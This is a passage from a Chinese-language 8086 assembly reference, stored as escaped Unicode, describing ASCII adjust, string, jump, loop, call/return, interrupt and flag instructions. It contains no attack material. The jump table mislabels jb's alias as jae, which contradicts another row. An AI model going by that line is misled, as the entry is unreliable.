\u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801 if (af == 1 || (af&0Fh) > 9) al = (al-6)&0Fh, ah -= 1, af = 1, cf = 1 else af = 0, cf = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ax , 0201 h ; 21 sub al , 9 ; al = 0F8h, af = 1, cf = 1 aas ; ax = 0102h \u5373 12 mov ax , 0335 h ; 35 sub al , 38 h ; (\u51cf 8) al = 0FDh, af = 1, cf = 1 aas ; ax = 0207h \u5373 27 aam \u6307\u4ee4\u683c\u5f0f \uff1aaam \u6307\u4ee4\u4f5c\u7528 \uff1a\u4e58\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u4e58\u6cd5\u540e\u5bf9\u5176\u505a\u8c03\u6574 ah = al / 10, al = al % 10 OF DF IF TF SF ZF AF PF CF \u4f8b mov al , 3 mov bl , 4 mul bl ; ax = 000Ch aam ; ax = 0102h \u5373 12 aad \u6307\u4ee4\u683c\u5f0f \uff1aaad \u6307\u4ee4\u4f5c\u7528 \uff1a\u9664\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 ax \u88ab\u505a\u9664\u6cd5 \u524d \u5bf9\u5176\u8fdb\u884c\u8c03\u6574\uff0c\u4f7f\u9664\u6cd5\u7ed3\u679c\u4e3a BCD \u7801 al = ah * 10 + al, ah = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ax , 0105 h ; 15 mov cl , 4 aad ; ax = 000Fh div cl ; al = 03h, ah = 03h \u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4 \u00b6 \u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5206\u4e3a movs \u5b57\u7b26\u4e32\u4f20\u9001\u3001cmps \u5b57\u7b26\u4e32\u6bd4\u8f83\u3001scas \u5b57\u7b26\u4e32\u626b\u63cf\u3001stos \u5b58\u5165\u5b57\u7b26\u4e32\u3001lods \u4ece\u5b57\u7b26\u4e32\u53d6\u4e94\u79cd\uff0c\u5b83\u4eec\u90fd\u53ef\u4ee5\u63a5\u4e00\u4e2a\u6307\u4ee4\u524d\u7f00\u3002\u5982\u679c\u4e0d\u63a5\u524d\u7f00\uff0c\u5219\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u5982\u679c\u63a5\u524d\u7f00\uff0c\u5219\u91cd\u590d\u6267\u884c\u3002lods \u6307\u4ee4\u4e0d\u5e38\u7528\u524d\u7f00 \u524d\u7f00 rep \u4f5c\u7528 \uff1a\u628a\u540e\u9762\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u91cd\u590d cx \u6b21 \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e00\u822c\u4e0d\u63a5 cmps scas \u524d\u7f00 repe / repz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a \u524d\u7f00 repne / repnz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u4e0d\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a \u5b57\u7b26\u4e32\u4f20\u9001\u6307\u4ee4 \u00b6 movsb \u6307\u4ee4\u683c\u5f0f \uff1amovsb / rep movsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a movsw \u6307\u4ee4\u683c\u5f0f \uff1amovsw / rep movsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a movs \u6307\u4ee4\u683c\u5f0f \uff1a (rep) movs byte ptr es:[di], byte ptr seg:[si] (rep) movs word ptr es:[di], word ptr seg:[si] \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u8282/\u5b57\u4e3a\u5355\u4f4d\u4ece seg:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\uff0c\u5f53 seg \u4e3a ds \u65f6\u4e0e movsb/movsw \u7b49\u4ef7\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a \u5b57\u7b26\u4e32\u6bd4\u8f83\u6307\u4ee4 \u00b6 cmpsb \u6307\u4ee4\u683c\u5f0f \uff1acmpsb / repe cmpsb / repne cmpsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57\u8282 ds:[si] \u4e0e es:[di]\uff0c\u5373 byte ptr ds:[si] - byte ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF cmpsw \u6307\u4ee4\u683c\u5f0f \uff1acmpsw / repe cmpsw / repne cmpsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57 ds:[si] \u4e0e es:[di]\uff0c\u5373 word ptr ds:[si] - word ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF cmps \u6307\u4ee4\u683c\u5f0f \uff1a (repe/repne) cmps byte ptr seg:[si], byte ptr es:[di] (repe/repne) cmps word ptr seg:[si], word ptr es:[di] \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57\u8282/\u5b57 seg:[si] \u4e0e es:[di]\uff0c\u5373\u5de6\u51cf\u53f3\u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF \u5b57\u7b26\u4e32\u626b\u63cf\u6307\u4ee4 \u00b6 scasb \u6307\u4ee4\u683c\u5f0f \uff1ascasb / repe scasb / repne scasb \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83 al \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 al - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF scasw \u6307\u4ee4\u683c\u5f0f \uff1ascasw / repe scasw / repne scasw \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83 ax \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 ax - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF \u5b58\u5165\u5b57\u7b26\u4e32\u6307\u4ee4 \u00b6 stosb \u6307\u4ee4\u683c\u5f0f \uff1astosb / rep stosb \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a\u5b57\u8282 al \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a stosw \u6307\u4ee4\u683c\u5f0f \uff1astosw / rep stosw \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a\u5b57 ax \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a \u4ece\u5b57\u7b26\u4e32\u53d6\u6307\u4ee4 \u00b6 lodsb \u6307\u4ee4\u683c\u5f0f \uff1alodsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5b58\u5165 al\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a lodsw \u6307\u4ee4\u683c\u5f0f \uff1alodsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u5b58\u5165 ax\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a lods \u6307\u4ee4\u683c\u5f0f \uff1a lods byte ptr seg:[si] lods word ptr seg:[si] \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece seg:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282/\u5b57\u5b58\u5165 al/ax\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a \u63a7\u5236\u8f6c\u79fb\u6307\u4ee4 \u00b6 \u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 \u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 jmp \u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u5373\u77ed\u8df3\u3001\u8fd1\u8df3\u3001\u8fdc\u8df3\uff0c\u5176\u64cd\u4f5c\u7801\u548c\u64cd\u4f5c\u6570\u5747\u4e0d\u540c jmp \u77ed\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest / jmp short dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u53ea\u80fd\u4e3a\u7acb\u5373\u6570\uff0c\u4e14\u76ee\u6807\u5730\u5740 dest \u4e0e\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728\u8303\u56f4 [-128, 127] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e24\u5b57\u8282\uff08EBxx\uff0c\u540e\u4e24\u4f4d\u4e3a\u8ddd\u79bb\uff09 jmp \u8fd1\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728 [-32768, 32767] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e09\u5b57\u8282 jmp \u8fdc\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 cs:ip \u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1acs \u4e5f\u4f1a\u6539\u53d8\uff0cdest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740 \u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 j cc \u7c7b\u6307\u4ee4 \u6307\u4ee4\u683c\u5f0f \uff1aj cc dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0e\u6807\u5fd7\u4f4d\u6709\u5173\u7684\u6761\u4ef6 cc \u6210\u7acb\uff0c\u5219\u4ee4 ip \u7b49\u4e8e dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1a\u8fd9\u4e9b\u8df3\u8f6c\u90fd\u662f\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 \u6240\u6709\u6b64\u7c7b\u6307\u4ee4\u53ca\u6761\u4ef6 \u6307\u4ee4 \u610f\u4e49 \u6761\u4ef6 \u5907\u6ce8 jz \u7b49\u4e8e\u96f6\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e je jnz \u4e0d\u7b49\u4e8e\u96f6\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jne jc \u6709\u8fdb\u4f4d\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jb jnae jnc \u65e0\u8fdb\u4f4d\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnb jae js \u6709\u7b26\u53f7\u4f4d\u5219\u8df3 sf=1 jns \u65e0\u7b26\u53f7\u4f4d\u5219\u8df3 sf=0 jo \u6709\u6ea2\u51fa\u4f4d\u5219\u8df3 of=1 jno \u65e0\u6ea2\u51fa\u4f4d\u5219\u8df3 of=0 jp/jpe \u6709\u5947\u5076\u4f4d\u5219\u8df3 pf=1 jnp/jpo \u65e0\u5947\u5076\u4f4d\u5219\u8df3 pf=0 ja/jnbe \u65e0\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 cf=0 and zf=0 jae/jnb \u65e0\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnc jb/jae \u65e0\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jc jbe/jna \u65e0\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=1 or zf=1 jg/jnle \u6709\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 sf=of and zf=0 jge/jnl \u6709\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 sf=of jl/jnge \u6709\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 sf!=of jle/jng \u6709\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 sf!=of or zf=1 je \u76f8\u7b49\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e jz jne \u4e0d\u76f8\u7b49\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jnz jcxz \u6307\u4ee4\u683c\u5f0f \uff1ajcxz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c cx \u7b49\u4e8e\u96f6\u5219\u4ee4 ip \u7b49\u4e8e dest \u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1a\u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 \u5faa\u73af\u6307\u4ee4 \u00b6 loop \u6307\u4ee4\u683c\u5f0f \uff1aloop dest \u6307\u4ee4\u4f5c\u7528 \uff1acx \u8868\u793a\u5faa\u73af\u6b21\u6570\uff0ccx \u5148\u51cf 1\uff0c\u5982\u679c cx \u4e0d\u4e3a 0 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloop \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loopz \u6307\u4ee4\u683c\u5f0f \uff1aloopz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx \u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 1 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloopz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loope \u6307\u4ee4\u683c\u5f0f \uff1aloope dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u76f8\u7b49\u5219\u5faa\u73af \u6ce8\u610f \uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopz loopnz \u6307\u4ee4\u683c\u5f0f \uff1aloopnz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0d\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx \u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 0 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloopnz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loopne \u6307\u4ee4\u683c\u5f0f \uff1aloopne dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u5faa\u73af \u6ce8\u610f \uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopnz \u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de\u6307\u4ee4 \u00b6 call \u7c7b\u4f3c jmp \u7684\u8fd1\u8df3\u8fdc\u8df3\u4e5f\u6709\u8fd1\u8fc7\u7a0b\u8c03\u7528\u548c\u8fdc\u8fc7\u7a0b\u8c03\u7528\uff0c\u5176\u533a\u522b\u4e5f\u5728\u4e8e cs \u662f\u5426\u53d1\u751f\u53d8\u5316 call \u8fd1\u8c03\u7528 \u6307\u4ee4\u683c\u5f0f \uff1acall dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u5165\u6808\u7136\u540e\u8df3\u8f6c\u5230 dest\uff0c\u5373 push ip, ip = dest \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58 retn \u6307\u4ee4\u683c\u5f0f \uff1aretn / ret / retn count / ret count \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fd1\u8fd4\u56de retn / ret\uff1a\u4ece\u6808\u4e2d\u5f39\u51fa\u4e00\u4e2a\u5341\u516d\u4f4d\u6570\u5230 ip\uff0c\u5373 pop ip retn count / ret count\uff1a\u5148 pop ip \u7136\u540e sp += count \u6ce8\u610f \uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fd1\u8c03\u7528\u8fd4\u56de call \u8fdc\u8c03\u7528 \u6307\u4ee4\u683c\u5f0f \uff1acall dest \u6307\u4ee4\u4f5c\u7528 \uff1apush cs, push ip, cs:ip = dest \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740 retf \u6307\u4ee4\u683c\u5f0f \uff1aretf / retf count \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fdc\u8fd4\u56de\uff0cpop ip, pop cs\uff0c\u82e5\u6709 count \u5219 sp += count \u6ce8\u610f \uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fdc\u8c03\u7528\u8fd4\u56de \u4e2d\u65ad\u548c\u4e2d\u65ad\u8fd4\u56de\u6307\u4ee4 \u00b6 \u4e2d\u65ad\u6307\u4ee4\u4e00\u822c\u7528\u4e8e\u5411\u7cfb\u7edf\u63d0\u51fa\u4e2d\u65ad\u8bf7\u6c42\u5f97\u5230\u7cfb\u7edf\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u770b\u4f5c\u8c03\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u51fd\u6570 int \u6307\u4ee4\u683c\u5f0f \uff1aint n \u6307\u4ee4\u4f5c\u7528 \uff1a\u8c03\u7528 n \u53f7\u4e2d\u65ad\uff0c\u7b49\u6548\u7684\u64cd\u4f5c\u6709 pushf, push cs, push ip tf = 0, if = 0, ip = word ptr 0:[n*4], cs = word ptr 0:[n*4+2] \u6ce8\u610f \uff1an \u4e3a\u7acb\u5373\u6570\uff0c\u79f0\u4e3a\u4e2d\u65ad\u53f7\uff0c\u5728\u8303\u56f4 [0, 0FFh] \u5185\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a OF DF IF TF SF ZF AF PF CF into \u6307\u4ee4\u683c\u5f0f \uff1ainto \u6307\u4ee4\u4f5c\u7528 \uff1a\u6ea2\u51fa\u4e2d\u65ad\uff0c\u5982\u679c of == 1 \u5219\u8c03\u7528 4 \u53f7\u4e2d\u65ad\uff08int 4h\uff09\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a OF DF IF TF SF ZF AF PF CF iret \u6307\u4ee4\u683c\u5f0f \uff1airet \u6307\u4ee4\u4f5c\u7528 \uff1a\u4e2d\u65ad\u8fd4\u56de\uff0c\u7b49\u6548\u64cd\u4f5c\u6709 pop ip, pop cs, popf \u6ce8\u610f \uff1a\u4e00\u822c\u7528\u4e8e\u4ece int \u6216 into \u4ea7\u751f\u7684\u4e2d\u65ad\u4e2d\u8fd4\u56de\uff0c\u6807\u5fd7\u4f4d\u56de\u5230\u4e2d\u65ad\u524d\u7684\u72b6\u6001 \u6742\u7c7b\u6307\u4ee4 \u00b6 clc \u6307\u4ee4\u683c\u5f0f \uff1aclc \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 0 OF DF IF TF SF ZF AF PF CF stc \u6307\u4ee4\u683c\u5f0f \uff1astc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 1 OF DF IF TF SF ZF AF PF CF cmc \u6307\u4ee4\u683c\u5f0f \uff1acmc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fdb\u4f4d\u4f4d\u6c42\u53cd\uff0c\u5373 cf = ~cf OF DF IF TF SF ZF AF PF CF cld \u6307\u4ee4\u683c\u5f0f \uff1acld \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u65b9\u5411\u4f4d\uff0c\u5373 df = 0\uff08\u6b63\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF std \u6307\u4ee4\u683c\u5f0f \uff1astd \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u65b9\u5411\u4f4d\uff0c\u5373 df = 1\uff08\u8d1f\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF cli \u6307\u4ee4\u683c\u5f0f \uff1acli \u6307\u4ee4\u4f5c\u7528 \uff1a\u7981\u6b62\u4e2d\u65ad\uff0c\u5373 if = 0 OF DF IF TF SF ZF AF PF CF sti \u6307\u4ee4\u683c\u5f0f \uff1asti \u6307\u4ee4\u4f5c\u7528 